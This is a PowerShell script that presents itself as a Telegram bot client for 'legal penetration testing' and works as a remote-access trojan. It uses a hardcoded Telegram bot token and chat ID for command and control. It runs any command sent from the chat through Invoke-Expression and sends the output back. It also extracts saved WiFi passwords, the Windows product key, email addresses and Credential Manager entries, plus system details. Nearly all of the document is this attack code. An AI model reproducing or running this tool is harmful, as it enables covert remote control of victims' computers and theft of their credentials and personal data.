# Telegram Bot Client - Complete Script with Enhanced /email Command
# For legal penetration testing and system administration only

# Check credentials
# uncomment to use a previously set bot token
#if (-not $env:TELEGRAM_BOT_TOKEN -or -not $env:TELEGRAM_CHAT_ID) {
#    Write-Host "ERROR: Set environment variables first!" -ForegroundColor Red
#    Write-Host ""
#    Write-Host "Run these commands in PowerShell:" -ForegroundColor Yellow
#    Write-Host '  $env:TELEGRAM_BOT_TOKEN = "YOUR_TOKEN_HERE"' -ForegroundColor Cyan
#    Write-Host '  $env:TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"' -ForegroundColor Cyan
#    Write-Host ""
#    Write-Host "Then run this script again." -ForegroundColor Yellow
#    exit
#}

# Bot setup
$token = "8092707099:AAFJyU4S78TVQjw3CRg6SAZKW8RzdygR0fU"
$chatId = "7011713461"
$api = "https://api.telegram.org/bot$token"

Write-Host "Starting Telegram Bot Client..." -ForegroundColor Green
Write-Host "Token: $($token.Substring(0,10))..." -ForegroundColor Yellow
Write-Host "Chat ID: $chatId" -ForegroundColor Yellow
Write-Host "----------------------------------------" -ForegroundColor Gray

# Get current offset to ignore old messages
try {
    $lastUpdate = Invoke-RestMethod "$api/getUpdates" -ErrorAction Stop
    if ($lastUpdate.ok -and $lastUpdate.result.Count -gt 0) {
        $offset = $lastUpdate.result[-1].update_id + 1
    } else {
        $offset = 0
    }
    Write-Host "Starting offset: $offset" -ForegroundColor Cyan
} catch {
    Write-Host "Could not get initial offset, starting from 0" -ForegroundColor Yellow
    $offset = 0
}

# Simple session tracking (in-memory)
$global:BotSessions = @{}
$global:BotSessions[$chatId] = @{
    Alias = 1
    Hostname = $env:COMPUTERNAME
    User = $env:USERNAME
    LastSeen = Get-Date
}
$currentAlias = 1
$selectedAlias = $currentAlias

# Send message function
function Send-Msg {
    param($text)
    try {
        $body = @{chat_id=$chatId; text=$text} | ConvertTo-Json
        $null = Invoke-RestMethod -Uri "$api/sendMessage" -Method Post `
            -ContentType "application/json; charset=utf-8" -Body $body -ErrorAction Stop
        return $true
    } catch {
        Write-Host "Send error: $_" -ForegroundColor Red
        return $false
    }
}

# Execute command function
function Run-Cmd {
    param($cmd)
    try {
        $output = Invoke-Expression $cmd 2>&1 | Out-String
        if ([string]::IsNullOrWhiteSpace($output)) {
            return "(Command executed successfully - no output)"
        }
        return $output.Trim()
    } catch {
        return "Error: $_"
    }
}

# Get WiFi passwords - Works for both Spanish and English systems
function Get-Wifi-Passwords {
    $output = "=== WiFi Networks with Passwords ===`n"
    
    try {
        # Get profiles - check both English and Spanish
        $profiles = @()
        $wlanOutput = netsh wlan show profiles
        
        # Check for English "All User Profile"
        $profiles += $wlanOutput | Select-String "All User Profile" | ForEach-Object {
            ($_ -split ":")[1].Trim()
        }
        
        # Check for Spanish "Perfil de todos los usuarios"
        $profiles += $wlanOutput | Select-String "Perfil de todos los usuarios" | ForEach-Object {
            ($_ -split ":")[1].Trim()
        }
        
        # Remove duplicates
        $profiles = $profiles | Select-Object -Unique
        
        if ($profiles.Count -eq 0) {
            $output += "No WiFi profiles found`n"
            return $output
        }
        
        $foundPasswords = $false
        
        foreach ($profile in $profiles) {
            try {
                $profileInfo = netsh wlan show profile name="$profile" key=clear
                
                # Check for password in both languages
                $passwordLine = $profileInfo | Select-String "Key Content|Contenido de la clave"
                
                if ($passwordLine) {
                    $password = ($passwordLine -split ":")[1].Trim()
                    $output += "$profile : $password`n"
                    $foundPasswords = $true
                } else {
                    $output += "$profile : (No password/Open network)`n"
                }
            } catch {
                $output += "$profile : (Error retrieving)`n"
            }
        }
        
        if (-not $foundPasswords) {
            $output += "No saved passwords found`n"
        }
        
    } catch {
        $output += "Error: $_`n"
    }
    
    return $output
}

# ENHANCED: Get Email addresses from system
function Get-Email-Addresses {
    $results = @()
    
    # ===== METHOD 1: Try via Outlook's COM API (Good for user's own emails) =====
    try {
        Write-Host "Attempting Outlook lookup..." -ForegroundColor Gray
        Add-Type -AssemblyName Microsoft.Office.Interop.Outlook
        $outlook = New-Object -ComObject Outlook.Application
        $namespace = $outlook.GetNamespace("MAPI")
        
        # Get current user's email from default account
        foreach ($account in $namespace.Accounts) {
            $results += "Outlook Account: $($account.SmtpAddress)"
        }
        
        # Try to get the first entry from the Global Address List (GAL)
        try {
            $gal = $namespace.GetGlobalAddressList()
            $firstEntry = $gal.AddressEntries.GetFirst()
            if ($firstEntry) {
                $exUser = $firstEntry.GetExchangeUser()
                if ($exUser.PrimarySmtpAddress) {
                    $results += "GAL Sample: $($exUser.PrimarySmtpAddress)"
                }
            }
        } catch { <# GAL not available is common #> }
        
        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($outlook) | Out-Null
        if ($results) { return "Found email addresses:`n" + ($results -join "`n") }
    } catch {
        Write-Host "Outlook method failed (likely not installed/configured)." -ForegroundColor DarkYellow
    }
    
    # ===== METHOD 2: Check local Windows Identity & Registry (Fallback) =====
    # Improved local checks
    $localChecks = @()
    
    # 1. Check current user's identity (for Azure AD joined machines)
    $currentUser = whoami
    if ($currentUser -match "@") { $localChecks += "Azure AD User: $currentUser" }
    
    # 2. Check OneDrive for Business account (common source)
    $oneDrivePaths = @("HKCU:\Software\Microsoft\OneDrive\Accounts\Business1", "HKCU:\Software\Microsoft\OneDrive\Accounts\Personal")
    foreach ($path in $oneDrivePaths) {
        if (Test-Path $path) {
            $email = (Get-ItemProperty -Path $path -Name "UserEmail" -ErrorAction SilentlyContinue).UserEmail
            if ($email) { $localChecks += "OneDrive: $email" }
        }
    }
    
    # 3. Check Office registry more thoroughly
    $officePath = "HKCU:\Software\Microsoft\Office"
    if (Test-Path $officePath) {
        # Look for Outlook profiles
        $outlookVersions = Get-ChildItem "$officePath\*\Outlook\Profiles" -ErrorAction SilentlyContinue
        foreach ($profilePath in $outlookVersions) {
            $accounts = Get-ChildItem "$profilePath\*\*\*" -ErrorAction SilentlyContinue
            foreach ($acc in $accounts) {
                $email = (Get-ItemProperty -Path $acc.PSPath -Name "Email" -ErrorAction SilentlyContinue).Email
                if ($email) { $localChecks += "Office Config: $email" }
            }
        }
    }
    
    # 4. Check Credential Manager for saved email addresses
    try {
        $credCmdkey = cmdkey /list 2>$null
        $emailMatches = $credCmdkey | Select-String "@"
        foreach ($match in $emailMatches) { $localChecks += "Saved Credential: $($match.ToString().Trim())" }
    } catch {}
    
    if ($localChecks.Count -gt 0) {
        return "Found local email traces:`n" + ($localChecks -join "`n")
    }
    
    # Final fallback
    return "No email addresses found. Try on a domain-joined PC with Outlook or Exchange admin rights."
}

# Get Windows Product Key
function Get-Windows-Key {
    try {
        $path = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
        $digitalProductId = (Get-ItemProperty -Path $path -Name "DigitalProductId" -ErrorAction SilentlyContinue).DigitalProductId
        
        if ($digitalProductId) {
            $chars = "BCDFGHJKMPQRTVWXY2346789"
            $key = ""
            
            for ($i = 24; $i -ge 0; $i--) {
                $cur = 0
                for ($j = 14; $j -ge 0; $j--) {
                    $cur = ($cur -shl 8) -bxor $digitalProductId[$j]
                    $digitalProductId[$j] = [math]::Truncate($cur / 24)
                    $cur = $cur % 24
                }
                $key = $chars[$cur] + $key
            }
            
            # Format the key with dashes
            $formattedKey = $key.Insert(5, "-").Insert(11, "-").Insert(17, "-").Insert(23, "-")
            return "Windows Product Key: $formattedKey"
        }
        
        # Alternative location
        $path2 = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform"
        $backupKey = (Get-ItemProperty -Path $path2 -Name "BackupProductKeyDefault" -ErrorAction SilentlyContinue).BackupProductKeyDefault
        
        if ($backupKey) {
            return "Windows Product Key: $backupKey"
        }
        
        return "Could not retrieve Windows product key"
    } catch {
        return "Error retrieving Windows key: $_"
    }
}

# Send welcome message
$welcome = @"
=== BOT CONNECTED ===
Alias: $currentAlias
Hostname: $env:COMPUTERNAME
User: $env:USERNAME
Time: $(Get-Date -Format "HH:mm:ss")
====================
Type /help for commands
"@

Send-Msg $welcome
Write-Host "Welcome message sent" -ForegroundColor Green
Write-Host "Bot is now active and listening for commands..." -ForegroundColor Green
Write-Host "Press Ctrl+C to stop" -ForegroundColor Yellow

# Main loop
while ($true) {
    try {
        # Get new messages
        $url = "${api}/getUpdates?offset=$offset&timeout=30"
        $response = Invoke-RestMethod -Uri $url -ErrorAction Stop
        
        foreach ($update in $response.result) {
            $offset = $update.update_id + 1
            
            if ($update.message.text) {
                $msg = $update.message.text.Trim()
                Write-Host "Processing: $msg" -ForegroundColor Cyan
                
                # Update session activity
                $global:BotSessions[$chatId].LastSeen = Get-Date
                
                # Process command - SPECIAL COMMANDS WITH /
                if ($msg.StartsWith('/')) {
                    switch -Regex ($msg.ToLower()) {
                        '^/help$' {
                            $helpText = @"
=== AVAILABLE COMMANDS ===

GENERAL USAGE:
- Type any PowerShell command: dir, ipconfig, whoami, etc.
- Example: 'Get-Process | Select-Object -First 5'

SPECIAL COMMANDS (with /):
- /help      - Show this message
- /sessions  - List all active sessions
- /info      - System information
- /key       - Windows product key
- /email     - Find email addresses in system
- /wifi      - Show WiFi passwords

SESSION CONTROL:
- /sessions [number] - Switch to session (future feature)
- exit               - End this session (without /)

Current session: Alias $currentAlias
"@
                            Send-Msg $helpText
                            continue
                        }
                        
                        '^/sessions$' {
                            $sessionList = "=== ACTIVE SESSIONS ===`n"
                            $sessionList += "Total: $($global:BotSessions.Count)`n"
                            $sessionList += "Selected: $selectedAlias`n`n"
                            
                            foreach ($sessionChatId in $global:BotSessions.Keys) {
                                $session = $global:BotSessions[$sessionChatId]
                                $marker = if ($session.Alias -eq $selectedAlias) { "* " } else { "  " }
                                $age = [math]::Round((New-TimeSpan -Start $session.LastSeen -End (Get-Date)).TotalMinutes, 1)
                                $sessionList += "$marker[$($session.Alias)] $($session.Hostname) - $($session.User) (${age}m ago)`n"
                            }
                            
                            Send-Msg $sessionList
                            continue
                        }
                        
                        '^/sessions\s+(\d+)$' {
                            $newAlias = [int]$matches[1]
                            $sessionFound = $global:BotSessions.Values | Where-Object { $_.Alias -eq $newAlias }
                            
                            if ($sessionFound) {
                                $selectedAlias = $newAlias
                                Send-Msg "Switched to session $newAlias ($($sessionFound.Hostname) - $($sessionFound.User))"
                            } else {
                                Send-Msg "Session $newAlias not found"
                            }
                            continue
                        }
                        
                        '^/info$' {
                            try {
                                $os = Get-WmiObject Win32_OperatingSystem
                                $cpu = Get-WmiObject Win32_Processor | Select-Object -First 1
                                $ram = Get-WmiObject Win32_ComputerSystem
                                $disk = Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='C:'"
                                
                                $info = @"
=== SYSTEM INFORMATION ===
Session:    $currentAlias
Hostname:   $env:COMPUTERNAME
User:       $env:USERNAME
Domain:     $env:USERDOMAIN

--- Operating System ---
OS:         $($os.Caption)
Version:    $($os.Version)
Build:      $($os.BuildNumber)
Arch:       $($os.OSArchitecture)

--- Hardware ---
CPU:        $($cpu.Name)
Cores:      $($cpu.NumberOfCores)
RAM:        $([math]::Round($ram.TotalPhysicalMemory/1GB, 2)) GB
Disk C:     $([math]::Round($disk.Size/1GB, 2)) GB total, $([math]::Round($disk.FreeSpace/1GB, 2)) GB free

--- Network ---
IP Address: $(try { (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.PrefixOrigin -ne 'WellKnown' } | Select-Object -First 1).IPAddress } catch { 'Unknown' })
"@
                                Send-Msg $info
                            } catch {
                                Send-Msg "System info: $env:COMPUTERNAME - $env:USERNAME"
                            }
                            continue
                        }
                        
                        '^/key$' {
                            $keyInfo = Get-Windows-Key
                            Send-Msg $keyInfo
                            continue
                        }
                        
                        '^/email$' {
                            $emailInfo = Get-Email-Addresses
                            Send-Msg $emailInfo
                            continue
                        }
                        
                        '^/wifi$' {
                            $wifiInfo = Get-Wifi-Passwords
                            Send-Msg $wifiInfo
                            continue
                        }
                        
                        default {
                            Send-Msg "Unknown command. Use /help for available commands."
                        }
                    }
                }
                # Regular commands (without /) and exit
                else {
                    switch ($msg.ToLower()) {
                        'exit' {
                            Send-Msg "Session $currentAlias ending. Goodbye!"
                            Write-Host "Exit command received, stopping..." -ForegroundColor Yellow
                            exit
                        }
                        default {
                            $result = Run-Cmd $msg
                            Send-Msg $result
                        }
                    }
                }
            }
        }
        
        # Small delay
        Start-Sleep -Milliseconds 500
        
    } catch {
        Write-Host "Error in main loop: $_" -ForegroundColor Red
        Write-Host "Retrying in 5 seconds..." -ForegroundColor Yellow
        Start-Sleep -Seconds 5
    }
}
